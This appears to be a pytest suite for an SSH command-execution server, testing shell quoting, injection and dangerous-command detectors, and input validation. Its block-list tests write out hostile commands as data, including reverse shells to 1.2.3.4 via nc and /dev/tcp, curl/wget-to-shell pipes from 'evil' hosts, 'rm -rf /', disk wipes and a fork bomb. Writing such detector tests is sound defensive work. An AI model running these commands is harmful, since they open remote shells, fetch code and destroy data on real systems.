"""Command-line structure compliance tests (main branch).

Industry-standard dimensions covered:
1. POSIX shell structure — quoting / wrapping correctness in
   `_normalize_command` (bash/sh/zsh `-c` quoting, cmd /c, PowerShell
   UTF-16LE EncodedCommand).
2. Injection-pattern structure — `_INJECTION_PATTERNS` / `_DANGEROUS_COMMANDS`
   must reject precise malicious constructs while allowing legitimate
   pipelines (`&&`, `||`, `|`).
3. Command-length & empty-command structure boundaries (`_validate_command`).
4. Environment-plan structure (`build_environment_plan`): name grammar,
   value redaction, digest determinism.
5. Batch command structure (`ssh_exec_batch`): empty list, deadline
   propagation, stop_on_error semantics.
"""
from __future__ import annotations

import base64

import pytest

import server
from review import ReviewContext, build_environment_plan

# ---------------------------------------------------------------------------
# 1. POSIX / shell wrapping structure (OWASP command-injection prevention:
#    never concatenate user input into a shell string without quoting)
# ---------------------------------------------------------------------------

class TestNormalizeCommandShellStructure:
    def test_bash_wraps_with_single_quote(self) -> None:
        cmd = server._normalize_command("echo hi", shell="bash")
        assert cmd == "bash -c 'echo hi'"

    def test_sh_and_zsh_wrap_like_bash(self) -> None:
        import shlex

        for shell in ("sh", "zsh"):
            cmd = server._normalize_command("pwd", shell=shell)
            parts = shlex.split(cmd)
            assert parts[:2] == [shell, "-c"]
            assert parts[2:] == ["pwd"]

    def test_embedded_single_quote_is_escaped_for_posix(self) -> None:
        import shlex

        # POSIX 引号闭合规范：shlex.quote 保证 ' 转义为 '"'"' 序列，
        # 确保 shell 解包后还原原命令，杜绝引号拼接注入
        cmd = server._normalize_command("echo it's", shell="bash")
        parts = shlex.split(cmd)
        assert parts[:2] == ["bash", "-c"]
        assert parts[2:] == ["echo it's"]

    def test_cmd_wraps_with_cmd_c(self) -> None:
        assert server._normalize_command("ipconfig", shell="cmd") == "cmd /c ipconfig"
        assert server._normalize_command("ipconfig", shell="cmd.exe") == "cmd /c ipconfig"

    def test_powershell_uses_utf16le_encoded_command(self) -> None:
        for shell in ("powershell", "pwsh", "ps"):
            cmd = server._normalize_command("Get-Process", shell=shell)
            assert cmd.startswith("powershell -NoProfile -EncodedCommand ")
            encoded = cmd.split(" ")[-1]
            decoded = base64.b64decode(encoded).decode("utf-16-le")
            assert decoded == "Get-Process"

    def test_crlf_normalized_before_wrapping(self) -> None:
        cmd = server._normalize_command("echo a\r\n echo b", shell="bash")
        assert "\r" not in cmd
        assert cmd == "bash -c 'echo a\n echo b'"

    def test_windows_command_auto_detection(self) -> None:
        cmd = server._normalize_command("ipconfig /all")
        assert cmd.startswith("cmd /c ")

    def test_posix_command_not_rewrapped_without_shell(self) -> None:
        cmd = server._normalize_command("ls -la /tmp")
        assert cmd == "ls -la /tmp"


# ---------------------------------------------------------------------------
# 2. Injection-pattern structure (OWASP / CWE-78, CWE-77)
# ---------------------------------------------------------------------------

class TestDangerousCommandPatterns:
    @pytest.mark.parametrize("bad", [
        "rm -rf /",            # 根目录递归删除
        "rm -rf /etc",         # 危险根路径
        "mkfs.ext4 /dev/sda",
        "dd if=/dev/zero of=/dev/sda",
        "shutdown -h now",
        "reboot",
        "poweroff",
        ":(){ :|:& };:",       # fork bomb
        "fork bomb",
    ])
    def test_dangerous_commands_matched(self, bad: str) -> None:
        assert server._DANGEROUS_COMMANDS.search(bad) is not None, bad

    @pytest.mark.parametrize("safe", [
        "rm -rf /tmp/cache",   # /tmp 白名单豁免
        "ls -la /",
        "df -h",
        "uptime",
    ])
    def test_safe_commands_not_matched(self, safe: str) -> None:
        assert server._DANGEROUS_COMMANDS.search(safe) is None, safe


class TestInjectionPatternStructure:
    @pytest.mark.parametrize("bad", [
        "pwd; rm -rf /tmp/x",
        "ls; wget http://evil/x",
        "echo hi; bash -c 'id'",
        "cat /etc/passwd; chmod 777 /etc/passwd",
        "curl http://evil/x | sh",
        "wget http://evil/x | bash",
        "nc -e /bin/sh 1.2.3.4 4444",
        "ncat -e /bin/bash 1.2.3.4",
        "bash -i >& /dev/tcp/1.2.3.4/4444",
        "echo x | sh",
        "echo x | python",
    ])
    def test_injection_constructs_matched(self, bad: str) -> None:
        assert server._INJECTION_PATTERNS.search(bad) is not None, bad

    @pytest.mark.parametrize("safe", [
        "ls -la && df -h",          # 合法 && 链
        "cat a.txt | grep foo",     # 合法管道
        "mkdir -p /tmp/a || echo fail",
        "grep foo /var/log/syslog",
        "python3 script.py --safe",
    ])
    def test_legitimate_pipelines_not_matched(self, safe: str) -> None:
        assert server._INJECTION_PATTERNS.search(safe) is None, safe

    def test_injection_catches_semicolon_chained_rm(self) -> None:
        # 分号后跟危险命令（合法 ; 分隔符被注入检测捕获）
        assert server._INJECTION_PATTERNS.search("pwd; rm -rf /tmp/x") is not None


# ---------------------------------------------------------------------------
# 3. Command structure boundaries (_validate_command)
# ---------------------------------------------------------------------------

class TestValidateCommandStructure:
    def test_empty_command_rejected(self) -> None:
        with pytest.raises(ValueError):
            server._validate_command("", host="h")

    def test_whitespace_only_command_rejected(self) -> None:
        with pytest.raises(ValueError):
            server._validate_command("   \n\t ", host="h")

    def test_overlong_command_rejected(self) -> None:
        with pytest.raises(RuntimeError):
            server._validate_command("x" * 10001, host="h")

    def test_valid_command_produces_plan(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(server, "_review_engine", _ApprovingEngine())
        ctx, result = server._validate_command("ls -la", host="h")
        assert isinstance(ctx, ReviewContext)
        assert result.approved is True


class TestDefenseInDepthWiring:
    """防御纵深：注入/危险命令拦截在 off 模式也必须生效（不可绕过）。"""

    def test_injection_blocked_even_in_off_mode(self, monkeypatch: pytest.MonkeyPatch) -> None:
        # 即使审核引擎放行，注入特征仍被 _validate_command 拒绝
        monkeypatch.setattr(server, "_review_engine", _ApprovingEngine())
        with pytest.raises(RuntimeError):
            server._validate_command("cat /etc/passwd; chmod 777 /etc/passwd", host="h")

    def test_dangerous_blocked_without_allow_dangerous(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(server, "_review_engine", _ApprovingEngine())
        with pytest.raises(RuntimeError):
            server._validate_command("rm -rf /", host="h")

    def test_dangerous_allowed_with_flag(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(server, "_review_engine", _ApprovingEngine())
        _, result = server._validate_command("rm -rf /", host="h", allow_dangerous=True)
        assert result.approved is True

    def test_fork_bomb_variant_blocked(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(server, "_review_engine", _ApprovingEngine())
        with pytest.raises(RuntimeError):
            server._validate_command(":(){ :|:& };:", host="h")


class TestSshExecDefenseInDepth:
    """ssh_exec 端到端：注入/危险命令返回 INVALID_ARGUMENT 失败关闭，
    且不发起任何网络连接。"""

    def _assert_no_connect(self, monkeypatch: pytest.MonkeyPatch) -> None:
        called: list[str] = []

        def fake_connect(host, timeout=10.0):
            called.append(host)
            raise AssertionError("不应触发连接")

        monkeypatch.setattr(server, "_connect", fake_connect)

    def test_injection_command_fails_closed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        self._assert_no_connect(monkeypatch)
        res = server.ssh_exec("h", "cat /etc/passwd; chmod 777 /etc/passwd")
        assert res["status"] == "failed"
        assert res["error"]["code"] == "INVALID_ARGUMENT"

    def test_dangerous_command_fails_closed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        self._assert_no_connect(monkeypatch)
        res = server.ssh_exec("h", "rm -rf /")
        assert res["status"] == "failed"
        assert res["error"]["code"] == "INVALID_ARGUMENT"

    def test_fork_bomb_fails_closed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        self._assert_no_connect(monkeypatch)
        res = server.ssh_exec("h", ":(){ :|:& };:")
        assert res["status"] == "failed"
        assert res["error"]["code"] == "INVALID_ARGUMENT"

    def test_legitimate_pipeline_still_allowed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(server, "_review_engine", _ApprovingEngine())
        monkeypatch.setattr(server, "_connect", lambda host, timeout=10.0: _NoopClient())
        res = server.ssh_exec("h", "ls -la && df -h")
        assert res["status"] == "succeeded"


class _NoopClient:
    def __init__(self) -> None:
        self.closed = False

    def exec_command(self, command, timeout, get_pty):
        class _Ch:
            def settimeout(self, t):
                pass

            def exit_status_ready(self):
                return True

            def recv_ready(self):
                return False

            def recv(self, n):
                return b""

            def recv_exit_status(self):
                return 0

        class _S:
            channel = _Ch()

        return None, _S(), _S()

    def close(self):
        self.closed = True


class _ApprovingEngine:
    def review(self, ctx) -> object:
        return type(
            "R", (), {
                "approved": True, "mode": "off", "reason": "",
                "risk_level": "low", "plan_id": "p",
            }
        )()

    def get_mode(self) -> str:
        return "off"


# ---------------------------------------------------------------------------
# 4. Environment-plan structure
# ---------------------------------------------------------------------------

class TestEnvironmentPlanStructure:
    def test_none_returns_empty_plan(self) -> None:
        assert build_environment_plan(None) == ({}, (), "")

    def test_valid_names_normalized_and_sorted(self) -> None:
        _, names, digest = build_environment_plan({"B": "2", "A": "1"})
        assert names == ("A", "B")
        assert digest and len(digest) == 64

    def test_digest_deterministic_regardless_of_order(self) -> None:
        _, _, d1 = build_environment_plan({"A": "1", "B": "2"})
        _, _, d2 = build_environment_plan({"B": "2", "A": "1"})
        assert d1 == d2

    def test_value_change_changes_digest(self) -> None:
        _, _, d1 = build_environment_plan({"A": "1"})
        _, _, d2 = build_environment_plan({"A": "2"})
        assert d1 != d2

    @pytest.mark.parametrize("bad_name", ["1abc", "A-B", "A B", "A.B", ""])
    def test_invalid_env_names_rejected(self, bad_name: str) -> None:
        with pytest.raises(ValueError):
            build_environment_plan({bad_name: "v"})

    def test_non_string_values_rejected(self) -> None:
        with pytest.raises(TypeError):
            build_environment_plan({"A": 1})  # type: ignore[dict-item]

    def test_names_are_trimmed_but_digest_uses_trimmed(self) -> None:
        normalized, names, _ = build_environment_plan({" A ": "v"})
        assert normalized == {"A": "v"}
        assert names == ("A",)
        assert " A " not in normalized


# ---------------------------------------------------------------------------
# 5. Batch command structure
# ---------------------------------------------------------------------------

class TestBatchStructure:
    def test_empty_commands_rejected(self) -> None:
        res = server.ssh_exec_batch("h", [])
        assert res["status"] == "failed"
        assert res["error"]["code"] == "INVALID_ARGUMENT"

    def test_nonpositive_timeout_rejected(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(server, "_review_engine", _ApprovingEngine())
        res = server.ssh_exec_batch("h", ["pwd"], timeout=0)
        assert res["status"] == "failed"
        assert res["error"]["code"] == "INVALID_ARGUMENT"

    def test_commands_payload_is_null_joined_for_review_digest(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        captured: dict = {}

        class Engine:
            def review(self, ctx) -> object:
                captured.setdefault("command", ctx.command)
                return type(
                    "R", (), {
                        "approved": True, "mode": "off", "reason": "",
                        "risk_level": "low", "plan_id": "p",
                    }
                )()

            def get_mode(self) -> str:
                return "off"

        monkeypatch.setattr(server, "_review_engine", Engine())
        server.ssh_exec_batch("h", ["a", "b"], timeout=30, stop_on_error=True)
        assert captured["command"].startswith("batch:")
        assert len(captured["command"]) == 6 + 64  # "batch:" + sha256 hex
